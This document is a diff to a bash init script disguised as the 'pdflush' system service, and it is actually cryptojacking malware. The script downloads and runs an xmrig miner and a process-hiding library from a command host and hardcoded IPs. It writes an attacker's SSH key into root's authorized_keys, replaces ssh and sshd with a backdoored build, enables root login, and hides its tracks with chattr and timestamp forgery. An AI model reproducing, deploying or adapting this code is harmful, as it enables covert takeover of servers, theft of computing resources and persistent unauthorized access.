@@ -1,6 +1,10 @@
 #!/bin/bash
+#chkconfig: 2345 81 96
+#description: pdflush
+
 pdflushType="launch"
-threads="$(cat /proc/cpuinfo | grep "processor" | wc -l)"
+
+threads=`cat /proc/cpuinfo|grep "processor"|wc -l`
 launch="/etc/init.d/pdflushs"
 xmrig="/usr/bin/kthreadds"
 config="/usr/bin/config.json"
@@ -14,130 +18,164 @@ cron="/lib64/libgc++.so"
 ssh="/etc/ssh"
 sshd="/usr/sbin"
 
-usage() {
+usage(){
     echo "Usage: $launch {start|status}"
 }
 
-status() {
+status (){
     echo -e "\033[32mRunning... \033[0m"
 }
 
-checkUpdate() {
-    tmepIp=$($busybox ping Rainbow66.f3322.net -c1 | $busybox sed '1{s/[^(]*(//;s/).*//;q}')
-    if [[ $tmepIp == "127.0.0.1" ]]; then
-        remoteIp=188.121.119.155
-    elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
-        FIELD1=$(echo $tmepIp | cut -d. -f1)
-        FIELD2=$(echo $tmepIp | cut -d. -f2)
-        FIELD3=$(echo $tmepIp | cut -d. -f3)
-        FIELD4=$(echo $tmepIp | cut -d. -f4)
-        if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]; then
+checkUpdate(){
+    tmepIp=`$busybox ping Rainbow66.f3322.net -c1|$busybox sed '1{s/[^(]*(//;s/).*//;q}'`
+    if [[ $tmepIp == "127.0.0.1" ]]
+    then
+        remoteIp=47.106.187.104
+    elif [[ $tmepIp =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]
+    then
+        FIELD1=$(echo $tmepIp|cut -d. -f1)
+        FIELD2=$(echo $tmepIp|cut -d. -f2)
+        FIELD3=$(echo $tmepIp|cut -d. -f3)
+        FIELD4=$(echo $tmepIp|cut -d. -f4)
+        if [ $FIELD1 -le 255 -a $FIELD2 -le 255 -a $FIELD3 -le 255 -a $FIELD4 -le 255 ]
+        then
             remoteIp=$tmepIp
         else
-            remoteIp=188.121.119.155
+            remoteIp=47.106.187.104
         fi
     fi
-    remoteXmrigSha512=$($busybox wget http://$remoteIp/sha512/xmrig -O - -q)
-    remotePdflushsSha512=$($busybox wget http://$remoteIp/sha512/$pdflushType -O - -q)
-    remoteProcesshiderSha512=$($busybox wget http://$remoteIp/sha512/processhider -O - -q)
-    remoteCronSha512=$($busybox wget http://$remoteIp/sha512/cron -O - -q)
-    localXmrigSha512=$($busybox sha512sum $xmrig | $busybox awk '{print $1}')
-    localPdflushsSha512=$($busybox sha512sum $launch | $busybox awk '{print $1}')
-    localBusyboxSha512=$($busybox sha512sum $busybox | $busybox awk '{print $1}')
-    localProcesshiderSha512=$($busybox sha512sum $processhider | $busybox awk '{print $1}')
-    localCronSha512=$($busybox sha512sum $cron | $busybox awk '{print $1}')
-    
-    if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]; then
+    remoteXmrigSha512=`$busybox wget http://$remoteIp/sha512/xmrig -O - -q`
+    remotePdflushsSha512=`$busybox wget http://$remoteIp/sha512/$pdflushType -O - -q`
+    remoteProcesshiderSha512=`$busybox wget http://$remoteIp/sha512/processhider -O - -q`
+    remoteCronSha512=`$busybox wget http://$remoteIp/sha512/cron -O - -q`
+    localXmrigSha512=`$busybox sha512sum $xmrig|$busybox awk '{print $1}'`
+    localPdflushsSha512=`$busybox sha512sum $launch|$busybox awk '{print $1}'`
+    localBusyboxSha512=`$busybox sha512sum $busybox|$busybox awk '{print $1}'`
+    localProcesshiderSha512=`$busybox sha512sum $processhider|$busybox awk '{print $1}'`
+    localCronSha512=`$busybox sha512sum $cron|$busybox awk '{print $1}'`
+    if [[ $remotePdflushsSha512 != $localPdflushsSha512 ]]
+    then
         $busybox chattr -iaR /lib64/
         $busybox wget http://$remoteIp/update/launchUpdate -O /lib64/launchUpdate
         $busybox chmod a+x /lib64/launchUpdate
         nohup /lib64/launchUpdate > /dev/null &
     fi
-    
-    if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]; then
+    if [[ $remoteXmrigSha512 != $localXmrigSha512 ]]
+    then
         $busybox chattr -iaR /usr/bin/
         $busybox rm -f $xmrig
-        $busybox kill -9 $($busybox ps | $busybox grep kthreadds | $busybox grep -v grep | $busybox awk '{print $1}')
+        $busybox kill -9 `$busybox ps|$busybox grep kthreadds|$busybox grep -v grep|$busybox awk '{print $1}'`
     fi
-    
-    if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]; then
+    if [[ $remoteProcesshiderSha512 != $localProcesshiderSha512 ]]
+    then
         $busybox chattr -iaR /lib64/
         $busybox rm -f $processhider
         $busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
-        timeFile=$($busybox ls -t /lib64 | $busybox tail -1)
+        timeFile=`$busybox ls -t /lib64|$busybox tail -1`
         $busybox touch -r /lib64/$timeFile $processhider
         $busybox chattr +ai $processhider
     fi
-    
-    if [[ $remoteCronSha512 != $localCronSha512 ]]; then
+    if [[ $remoteCronSha512 != $localCronSha512 ]]
+    then
         $busybox chattr -iaR /lib64/
         $busybox rm -f $cron
-        $busybox kill -9 $($busybox ps | $busybox grep "libgc++.so" | $busybox grep -v grep | $busybox awk '{print $1}')
+        $busybox kill -9 `$busybox ps|$busybox grep "libgc++.so"|$busybox grep -v grep|$busybox awk '{print $1}'`
     fi
     exit
 }
 
-checkBackdoor() {
+checkBackdoor(){
     $busybox chattr +ai /root/.ssh/authorized_keys
     $busybox chattr -R +ai $backdoor
-    if [[ ! -e /root/.ssh ]]; then
+    if [[ ! -e /root/.ssh ]]
+    then
         mkdir /root/.ssh
     else
         $busybox chattr -aiR /root/.ssh/
     fi
-    
-    if ! $busybox grep -q "crbv0ds3/3MgVNHfXHGcCw" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]; then
-        $busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDV0zreCpf9ddN6w3XvbnwJRxzav3A0nGCX+tAjanb5BRDD1pLJXabRJxF28Lf7MtcvbF/vripTwM62FjfODIDuqrBKv2crbv0ds3/3MgVNHfXHGcCw6x5ezV0+kfyY0OBlVJv7iP9Q78mM38/Nfz/gGN5vYtsR3zVZrk23spXRFhuPbE8P6PHTAyXC99wi/cISBnV1130hz7/wi1M55PaXXHn+et3CPmao4yAV5zI2tatird5zMETIYK2n8VmkOUtIMlNDZC8wUhv/RB+Lgk81uPc3HCI/r8hulMAYyp8Bj2eHN1DDTWOpLqohnI45NGeReR2JIA/6l2lJNbQ+IRCn rsa 2048-040119" > /root/.ssh/authorized_keys
+    if ! $busybox grep -q "0BGFjfarxkNNs" /root/.ssh/authorized_keys || [[ ! -f /root/.ssh/authorized_keys ]]
+    then
+        $busybox echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCuRRM1jSZnIcUqYOWDYXzcfcKlQQFMYPH9qELiWkH7HIiJYMOhMtRyISxF52PAsEm19uXEhIc9OvXaf7uo4y1NxovZ/0BGFjfarxkNNs++nwgu2Sd20p5TCf8+bQp8FGn7NlGgMybUEKTl+bbUK/09xHCdYyu5m89SOjkD/SnyyIQe7HYkl5jik2YNkIQWGWXfg4DR9fm+YMfksj7k+KUkYx/B692DOc3/28Kiuni+XTPrmHdg/NgPuqPdbXarEPUOYMwxAydXrujZJ+iEwHcP5PrjB0lI3n84zohR5rf2GLMRpaSqVPZRK//i1hlMH/8iZy95zup50d35RHZaNF8UrnAGdDW4WNByY++UBx3QUJb/OaUJlC7WZ9gSs32M2MSsjBXeSzOImjQVDnZ1vA7HIXHtA1Z1fech31KOdW9WWRV0BRVCMjKQ74Pq2e2OoBLQdYUMbb3F9YqbH2BNoepGAVsGs/h+Wi+wsyoxFC73R/bUqyTB6yCedMY8gtXbWH8= noah@THE-MAIN-NODE" > /root/.ssh/authorized_keys
         $busybox chattr +ai /root/.ssh/authorized_keys
     fi
-    
-    if [[ $($busybox lsattr /root/.ssh/authorized_keys | $busybox awk '{print $1}' | $busybox grep i | $busybox grep -v grep | $busybox wc -l) != 1 ]]; then
+    if [[ `$busybox lsattr /root/.ssh/authorized_keys|$busybox awk '{print $1}'|$busybox grep i|$busybox grep -v grep|$busybox wc -l` != 1 ]]
+    then
         $busybox chattr +ai /root/.ssh/authorized_keys
     fi
-    
-    if [[ $threads -gt 8 ]]; then
-        if [[ $(ssh -B) != "Congratulations!" || $(sshd -B) != "Congratulations!" ]]; then
+    if [[ $threads -gt 8 ]]
+    then 
+        if [[ `ssh -B` != "Congratulations!" || `sshd -B` != "Congratulations!" ]]
+        then
             $busybox chattr -ai /etc/ssh/ssh_config
             $busybox chattr -ai /etc/ssh/sshd_config
             $busybox chattr -ai /etc/ssh/ssh_host_rsa_key
             $busybox rm /etc/ssh/ssh_config
             $busybox rm /etc/ssh/sshd_config
             $busybox rm /etc/ssh/ssh_host_rsa_key
-            $busybox chattr -ai $($busybox which ssh)
-            $busybox chattr -ai $($busybox which sshd)
+            $busybox chattr -ai `$busybox which ssh`
+            $busybox chattr -ai `$busybox which sshd`
             $busybox chattr -Rai $backdoor
             cd $backdoor
             make install
             $busybox chattr -R +ai $backdoor
-            timeFile=$($busybox ls -t $ssh | $busybox tail -1)
+            timeFile=`$busybox ls -t $ssh|$busybox tail -1`
             $busybox touch -r $timeFile $ssh/ssh
-            timeFile=$($busybox ls -t $sshd | $busybox tail -1)
+            timeFile=`$busybox ls -t $sshd|$busybox tail -1`
             $busybox touch -r $timeFile $ssh/sshd
-            $busybox chattr +ai $($busybox which ssh)
-            $busybox chattr +ai $($busybox which sshd)
+            $busybox chattr +ai `which ssh`
+            $busybox chattr +ai `which sshd`
             service sshd restart
         fi
-        if $busybox grep -q "PermitRootLogin no" /etc/ssh/sshd_config; then
-            $busybox chattr -ai /etc/ssh/sshd_config
+        if $busybox grep -q "PermitRootLogin no" /etc/ssh/sshd_config
+        then
             $busybox sed -i 's/PermitRootLogin no/PermitRootLogin yes/g' /etc/ssh/sshd_config
-            $busybox chattr +ai /etc/ssh/sshd_config
             service sshd restart
         fi
     fi
 }
 
-fixPermissions() {
-    $busybox chattr -i $preload
-    $busybox chmod 0444 $preload
-    $busybox chattr +i $preload
-}
+checkUpdate
+checkBackdoor
 
 case "$1" in
     start)
-        status
+        if [ ! -e $xmrig ]
+        then
+            $busybox wget http://$remoteIp/xmrig/xmrig -O $xmrig
+            $busybox chmod a+x $xmrig
+        fi
+        if [ ! -e $launch ]
+        then
+            $busybox wget http://$remoteIp/xmrig/pdflush -O $launch
+            $busybox chmod a+x $launch
+        fi
+        if [ ! -e $config ]
+        then
+            $busybox wget http://$remoteIp/xmrig/config.json -O $config
+        fi
+        if [ ! -e $cron ]
+        then
+            $busybox wget http://$remoteIp/xmrig/libgc++.so -O $cron
+        fi
+        if [ ! -e $processhider ]
+        then
+            $busybox wget http://$remoteIp/xmrig/processhider.so -O $processhider
+        fi
+        $busybox chattr -iR $cron
+        $busybox chattr -iR $xmrig
+        $busybox chattr -iR $processhider
+        nohup $xmrig -c $config > /dev/null &
+        nohup $launch > /dev/null &
+        if [ ! -e $preload ]
+        then
+            echo "$chattr" > $preload
+        fi
+        $busybox chattr +i $preload
+        exit
         ;;
     status)
         status
+        exit
         ;;
     *)
         usage
